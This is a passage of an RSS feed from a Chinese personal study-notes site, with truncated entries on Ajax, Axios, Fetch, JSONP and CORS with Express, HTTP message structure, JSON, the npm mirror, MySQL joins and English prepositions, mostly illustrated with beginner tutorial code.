      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/%E6%89%8B%E5%8A%A8%E5%8F%96%E6%B6%88%E8%AF%B7%E6%B1%82/</guid>
      <description>手动取消请求 服务端 const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;);  const app = express();  const port = 8000;  app.all(&amp;#39;/delay&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	// 设置延时响应 	setTimeout(() =&amp;gt; { 	response.send(&amp;#39;Hello IE&amp;#39;); 	}, 1000); }); app.listen(port, () =&amp;gt; { 	console.log(`服务已经启动`); }); HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Ajax 请求超时设置</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%AF%B7%E6%B1%82%E8%B6%85%E6%97%B6%E8%AE%BE%E7%BD%AE/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%AF%B7%E6%B1%82%E8%B6%85%E6%97%B6%E8%AE%BE%E7%BD%AE/</guid>
      <description>请求超时设置 服务端 const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;);  const app = express();  const port = 8000;  // 针对 ie 缓存的设置 app.all(&amp;#39;/delay&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	// 设置延时响应 	setTimeout(() =&amp;gt; { 	response.send(&amp;#39;Hello IE&amp;#39;); 	}, 3000); });  app.listen(port, () =&amp;gt; { 	console.log(`服务已经启动`); }); HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Ajax 跨域</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%B7%A8%E5%9F%9F/%E8%B7%A8%E5%9F%9F/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%B7%A8%E5%9F%9F/%E8%B7%A8%E5%9F%9F/</guid>
      <description>跨域 同源策略 同源策略是一种出于浏览器安全方面的考虑而出台的一种策略，它可以保证用户信息的安全，防止恶意的网站窃取。同源策略只允许与本域下的接口交互，不同源的客户端脚本在没有明确授权的情况下，不能读写对方的资源。
同源：同协议、同域名、同端口，必须完全相同，违背同源策略，就是跨域。
同源策略的限制范围  Cookie，localStorage，IndexDB 无法读取 DOM 无法获得 AJAX 请求不能发送  如何解决跨域问题 JSONP JSONP 是浏览器与客户端跨域通信常用的一种方法。
script标签本身具有跨域的特性，JSONP 就是借助这个特定来解决跨域的问题的。
CORS CORS 的全称是跨源资源共享，是一种 ajax 跨域请求资源的方式.
// * 表示所有网站都可以跨域请求当前服务器 response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); // 也可以只有某个网站才能对服务器发送跨域请求 response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;yxzi.xyz&amp;#39;); </description>
    </item>
    
    <item>
      <title>Ajax 重复发送请求的问题</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/%E9%87%8D%E5%A4%8D%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E7%9A%84%E9%97%AE%E9%A2%98/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/%E9%87%8D%E5%A4%8D%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E7%9A%84%E9%97%AE%E9%A2%98/</guid>
      <description>重复发送请求的问题 当用户重复发送同一个请求的时候，我们为了服务器的效率考虑，需要将之前发送的请求取消掉，只发送一个最新的请求，这样，服务器所受到的压力就要小很多。
服务端 const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;);  const app = express();  const port = 8000;  app.all(&amp;#39;/delay&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	// 设置延时响应 	setTimeout(() =&amp;gt; { 	response.send(&amp;#39;Hello IE&amp;#39;); 	}, 1000); });  app.listen(port, () =&amp;gt; { 	console.log(`服务已经启动`); }); HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Axios</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/axios/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/axios/</guid>
      <description>Axios Axios 是一个基于 promise 的 HTTP 库，简单的讲就是可以发送 get、post 请求。说到 get、post，大家应该第一时间想到的就是 Jquery 吧，毕竟前几年 Jquery 比较火的时候，大家都在用他。但是由于 Vue、React 等框架的出现，Jquery 也不是那么吃香了。也正是 Vue、React 等框架的出现，促使了 Axios 轻量级库的出现，因为 Vue 等，不需要操作 Dom，所以不需要引入 Jquery.js 了。
安装 npm install axios CND &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/axios/0.27.2/axios.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; </description>
    </item>
    
    <item>
      <title>Axios 发送 Ajax 请求</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/axios-%E5%8F%91%E9%80%81-ajax/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/axios-%E5%8F%91%E9%80%81-ajax/</guid>
      <description>Axios 发送 Ajax 请求 服务端 const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;);  const app = express();  const port = 8000;  app.all(&amp;#39;/axios&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;);  	const data = { name: &amp;#39;Rainy&amp;#39; }; 	const str = JSON.stringify(data); 	response.send(data); });  app.listen(port, () =&amp;gt; { 	console.log(`服务已经启动`); }); HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Fetch 发送 Ajax</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/fetch-%E5%8F%91%E9%80%81-ajax/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/fetch-%E5%8F%91%E9%80%81-ajax/</guid>
      <description>Fetch 发送 Ajax 服务端 const { json } = require(&amp;#39;body-parser&amp;#39;) const express = require(&amp;#39;express&amp;#39;)  const app = express()  const port = 8000  app.all(&amp;#39;/fetch&amp;#39;, (request, response) =&amp;gt; {  response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;)  response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;)   const data = { name: &amp;#39;Rainy&amp;#39; }  const str = JSON.stringify(data);  response.send(data) })   app.listen(port, () =&amp;gt; {  console.log(`服务已经启动`) }) HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Jquery 发送 Ajax</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/jquery-%E5%8F%91%E9%80%81-ajax/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/jquery-%E5%8F%91%E9%80%81-ajax/</guid>
      <description>Jquery 发送 Ajax 服务端 HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;./css/main.css&amp;#34;&amp;gt;  &amp;lt;title&amp;gt;Jquery 发送 Ajax&amp;lt;/title&amp;gt;  &amp;lt;/head&amp;gt;   &amp;lt;body&amp;gt;  &amp;lt;button id=&amp;#34;btn&amp;#34;&amp;gt;点击按钮，发送 GET 请求&amp;lt;/button&amp;gt;  &amp;lt;button id=&amp;#34;btnTwo&amp;#34;&amp;gt;点击按钮，发送 POST 请求&amp;lt;/button&amp;gt;  &amp;lt;button id=&amp;#34;btnThree&amp;#34;&amp;gt;点击按钮，发送通用方式请求&amp;lt;/button&amp;gt;   &amp;lt;div id=&amp;#34;result&amp;#34;&amp;gt;&amp;lt;/div&amp;gt;   &amp;lt;/body&amp;gt;  &amp;lt;script src=&amp;#34;./js/main.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;/html&amp;gt; CSS #result { 	width: 200px; 	height: 100px; 	border: 1px solid #999; } JavaScrip // get 方式 $(&amp;#39;#btn&amp;#39;).</description>
    </item>
    
    <item>
      <title>Jquery 发送 Jsonp</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%B7%A8%E5%9F%9F/jquery-%E5%8F%91%E9%80%81-jsonp/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%B7%A8%E5%9F%9F/jquery-%E5%8F%91%E9%80%81-jsonp/</guid>
      <description>Jquery 发送 Jsonp 服务端 const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;);  const app = express();  const port = 8000;  app.all(&amp;#39;/jquery_jsonp&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	// 定义数据 	const data = { 	city: &amp;#39;贵州&amp;#39;, 	}; 	// 将数据转为字符串 	let str = JSON.stringify(data); 	// 接受 callback 	let cb = request.query.callback; 	// 响应结果， 	response.</description>
    </item>
    
    <item>
      <title>原生 Jsonp 的实现</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%B7%A8%E5%9F%9F/%E5%8E%9F%E7%94%9F-jsonp-%E7%9A%84%E5%AE%9E%E7%8E%B0/</link>
      <pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/%E8%B7%A8%E5%9F%9F/%E5%8E%9F%E7%94%9F-jsonp-%E7%9A%84%E5%AE%9E%E7%8E%B0/</guid>
      <description>原生 Jsonp 的实现 服务端 const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;);  const app = express();  const port = 8000;  app.all(&amp;#39;/check&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	// 定义数据 	const data = { 	exist: 1, 	msg: &amp;#39;用户已经存在&amp;#39;, 	}; 	// 将数据转为字符串 	let str = JSON.stringify(data); 	// 响应结果，一个函数调用，函数已经在前端提前声明 	response.end(`handle(${str})`); });  app.listen(port, () =&amp;gt; { 	console.</description>
    </item>
    
    <item>
      <title>Ajax</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/ajax/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/ajax/</guid>
      <description>Ajax 可以理解为异步的 JavaScript 和 xml。
它是一种在无需重新加载整个网页的情况下，能够更新部分网页内容的技术。
它不是一种新的编程语言，而是一种将现有标准组合在一起使用的新方式。
优点 可以无需刷新页面与服务器进行通信。
允许根据用户事件来更新部分页面内容。
缺点 没有浏览历史，无法进行网页后退或前进的操作。
存在跨域问题。默认情况下，不同的域名之间，无法发送 Ajax 请求。
对 SEO 的优化不友好，Ajax 返回当数据不会在网页源代码中存在。</description>
    </item>
    
    <item>
      <title>Ajax GET 请求</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/get-%E8%AF%B7%E6%B1%82/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/get-%E8%AF%B7%E6%B1%82/</guid>
      <description>GET 请求 使用 GET 的方式向服务端发送一个请求。
服务端 const express = require(&amp;#39;express&amp;#39;); const app = express(); const port = 8000; app.get(&amp;#39;/server&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.send(&amp;#39;Hello World! GET&amp;#39;); }); // 允许 get 方式的请求 app.get(&amp;#39;/server&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.send(&amp;#39;Hello World!&amp;#39;); }); app.listen(port, () =&amp;gt; { 	console.log(`服务已经启动`); }); HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; 	&amp;lt;head&amp;gt; 	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt; 	&amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt; 	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Ajax 响应 JSON 数据</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/%E5%93%8D%E5%BA%94-json-%E6%95%B0%E6%8D%AE/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/%E5%93%8D%E5%BA%94-json-%E6%95%B0%E6%8D%AE/</guid>
      <description>响应 JSON 数据 服务端 const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;); const app = express(); const port = 8000; app.all(&amp;#39;/json-server&amp;#39;, (request, response) =&amp;gt; { 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	// 响应一个数据 	const data = { 	name: &amp;#39;Rainy&amp;#39;, 	age: &amp;#39;18&amp;#39;, 	}; 	// 将对象转换为字符串类型的数据 	let str = JSON.stringify(data); 	// 设置响应体，响应体只能是一个字符串 	response.send(str); });  app.listen(port, () =&amp;gt; { 	console.log(`服务已经启动`); }); HTML &amp;lt;!</description>
    </item>
    
    <item>
      <title>Express</title>
      <link>https://note.yxzi.xyz/note/technology/frame/express/express/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/express/express/</guid>
      <description>Express 基于 Node.js 的 Web 开发框架，可以快速地搭建一个完整功能的网站。
安装 新建一个工作区，输入npm install express --save即可。
基本使用 新建一个名为Express.js的 js 文件，输入代码：
// 引入 express const { json } = require(&amp;#39;body-parser&amp;#39;); const express = require(&amp;#39;express&amp;#39;);  // 创建应用对象 const app = express();  // 设置端口号 const port = 8000;  // 创建路由规则，允许所有方 式的请求 app.all(&amp;#39;/json-server&amp;#39;, (request, response) =&amp;gt; { 	// 设置响应头，允许跨域 	response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;); 	// 允许接收所有类型的响应头 	response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;); 	// 响应一个数据 	const data = { 	name: &amp;#39;Rainy&amp;#39;, 	age: &amp;#39;18&amp;#39;, 	}; 	// 将对象转换为字符串类型的数据 	let str = JSON.</description>
    </item>
    
    <item>
      <title>HTTP</title>
      <link>https://note.yxzi.xyz/note/technology/internet/http/http/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/http/http/</guid>
      <description>HTTP 超文本传输协议。详细规定了浏览器和万维网服务器之间互相通信的规则。
请求报文 浏览器向服务器发送内容的过程叫做请求。
请求报文一般包含四部分：行、头、空行、体。
请求行 请求类型：GET、POST 等。
URL 。
HTTP 协议的版本。
GET /ValidateLogin?&amp;amp;userI=4234234&amp;amp;password=234234 HTTP/1.1 请求头 请求头的格式通常时键名:键值
Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en- Cookie: Hm_lvt_a2e2e465098d883036e3cfad66f7203d=1633793709; Hm_lvt_bf329994f1e3ebf56f3712e11a46cb4a=1633794836; Hm_lvt_8516e418a4e3ac3474b3c13bdb4687e7=1638612924; _uab_collina=164345858532791240726438 Host: 127.0.0.1:5500 Content-Type # 设置请求体n类型 请求空行 空行必须有。
请求体 GET 的请求体是空的。
POST 的请求体可以不为空，也可以为空。
响应报文 服务器给客户端/浏览器返回结果的过程叫做响应。
响应报文一般包含四部分：行、头、空行、体。
响应行 HTTP 版本
响应状态码
响应状态字符串
HTTP/1.1 200 OK 响应头 Server: JSP3/2.0.14 Date: Sat, 30 Apr 2022 08:16:27 GMT Content-Type: text/javascript; charset=utf-8 Content-Length: 15758 Content-Encoding: gzip 响应空行 必须有</description>
    </item>
    
    <item>
      <title>JavaScrip JSON</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/json/json/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/json/json/</guid>
      <description>JOSN 一种轻量级的数据传输格式。本质上就是对象，用来传输的对象。
它在与后端的数据交互中有较为广泛的应用。
优点 JSON 比 XML 更小、更快，更易解析。
语法 客户端与服务端的交互数据无非就是两种：
 数组 对象  于是乎，JSON 所表示的数据要么就是对象，要么就是数组。
JSON 数组 var employees = [ 	{ firstName: &amp;#39;Bill&amp;#39;, lastName: &amp;#39;Gates&amp;#39; }, 	{ firstName: &amp;#39;George&amp;#39;, lastName: &amp;#39;Bush&amp;#39; }, 	{ firstName: &amp;#39;Thomas&amp;#39;, lastName: &amp;#39;Carter&amp;#39; }, ]; JSON 对象 var obj = { 	age: 20, 	str: &amp;#39;zhongfucheng&amp;#39;, 	method: function () { 	alert(&amp;#39;我爱学习&amp;#39;); 	}, }; </description>
    </item>
    
    <item>
      <title>JavaScrip JSON 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/json/json-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/json/json-%E6%96%B9%E6%B3%95/</guid>
      <description>JSON 方法 stringify() 将一个对象或值转换为 JSON 字符串。
var obj = { 	name: &amp;#39;rainy&amp;#39;, 	age: &amp;#39;20&amp;#39;, }; var result = JSON.stringify(obj); // 对象 console.log(obj);  // 字符串 console.log(result); parse() 将 JSON 字符串转换为对象。
var json = &amp;#39;{&amp;#34;name&amp;#34;:&amp;#34;rainy&amp;#34;, &amp;#34;age:&amp;#34;:20}&amp;#39;;var obj = JSON.parse(json);// 字符串console.log(json);// 对象console.log(obj); </description>
    </item>
    
    <item>
      <title>MySQL 交叉链接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E4%BA%A4%E5%8F%89%E9%93%BE%E6%8E%A5/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E4%BA%A4%E5%8F%89%E9%93%BE%E6%8E%A5/</guid>
      <description>交叉链接 返回左表中的所有行，左表中的每一行与右表中的所有行组合。交叉联接也称作笛卡尔积
笛卡尔乘积错误 表 1 有 N 行，表 2 有 M 行，最终的查询结果就是 M * N 行。****
SELECT b.name,boy.boyName FROM beauty AS b,boys AS boy 笛卡尔乘积也叫交叉链接：
SELECT b.name,boy.boyName FROM beauty AS b CROSS JOIN boys boy 导致错误的原因是因为没有添加有效的链接条件。
只需要添加有效的链接条件即可：
SELECT b.name,boy.boyName FROM beauty AS b LEFT OUTER JOIN boys AS boy # 链接条件 ON b.boyfriend_id = boy.id </description>
    </item>
    
    <item>
      <title>NodeJs</title>
      <link>https://note.yxzi.xyz/note/technology/nodejs/nodejs/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/nodejs/nodejs/</guid>
      <description>Node.js Node.js 不是一种独立的语言，也不是一个 JavaScript 的框架，Node.js 只是一个让 JavaScript 运行在浏览器之外的平台。
安装 Node.js </description>
    </item>
    
    <item>
      <title>Nodemon</title>
      <link>https://note.yxzi.xyz/note/technology/internet/ajax/nodemon/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/ajax/nodemon/</guid>
      <description>Nodemon 当我们开发一个 node 后端服务时，每次更改服务端文件，均需重启一下服务才能生效。这使我们的开发效率降低了很多。Nodemon 的出现，放我们可以随时监听文件的变更，自动重启服务，我们开发时只需关注代码即可，不再需要手动重启服务。
安装 终端运行
npm install -g nodemon 使用 nodemon server.js </description>
    </item>
    
    <item>
      <title>npm 镜像</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/npm-%E9%95%9C%E5%83%8F/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/npm-%E9%95%9C%E5%83%8F/</guid>
      <description>npm 镜像 因为 npm 服务器在国外，因此我们有时候 install 一些 package 的时候，会因为网络问题而下载失败，比如运行npm install时，出现以下错误：
 idealTree:Test: sill idealTree buildDeps 所以，我们需要换一个国内的镜像。
配置源地址为国内的淘宝镜像：
npm config set registry https://registry.npm.taobao.org 使用 nrm 工具切换淘宝源
npx nrm use tao 检查是否设置成功：
npm config get registry # 淘宝镜像 https://registry.npm.taobao.org/ 重新安装即可。</description>
    </item>
    
    <item>
      <title>XML</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/json/xml/</link>
      <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/json/xml/</guid>
      <description>XML 可扩展标记语言，主要用来传输和存储数据。
XML 和 HTML 类似，不同的是 HTML 中都是预定义的标签，用来呈现数据；而 XML 中没有预定义标签，都是自定义标签，用来表示一些数据。
不过，现在地 XML 已经被 JSON 取代了。</description>
    </item>
    
    <item>
      <title>English against</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/against/</link>
      <pubDate>Thu, 28 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/against/</guid>
      <description>against 表示接触 against + 人或事物的词语 表示靠着某人某物。强调两个事物的直接接触。
  He sat against the tree.
  She stood against each other.
  表示反对 against + 某些词语 表示反对&amp;hellip;。
  I am against this plan.
  Are you for this plan.
  </description>
    </item>
    
    <item>
      <title>English along</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/along/</link>
      <pubDate>Thu, 28 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/along/</guid>
      <description>along 表示运动 along + 地点或位置的词语 表示沿着某个地方运动。喜欢与动作表示动作趋向的不及物动词搭配。
 We go along the river.  </description>
    </item>
    
    <item>
      <title>English among</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/among/</link>
      <pubDate>Thu, 28 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/among/</guid>
      <description>among among + 名词的复数或表示复数的代词 表示在三者或三者以上的人或人或事物当中
 I am the poorest among all my friend.  </description>
    </item>
    
    <item>
      <title>English beyond</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/beyond/</link>
      <pubDate>Thu, 28 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/beyond/</guid>
      <description>beyondqian 表示位置 beyond + 比较远的位置的词语 表示**在&amp;hellip;外边。**强调在很远的地方的那一边。</description>
    </item>
    
    <item>
      <title>MySQL  内链接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/%E5%86%85%E9%93%BE%E6%8E%A5/</link>
      <pubDate>Thu, 28 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/%E5%86%85%E9%93%BE%E6%8E%A5/</guid>
      <description>内链接 查询的是多张表交集部分的记录。
SQL 99 内链接 SQL 99 支持内链接、外连接以及交叉链接，并且该版本的链接查询语法要比 SQL 92 的可读性要高）。
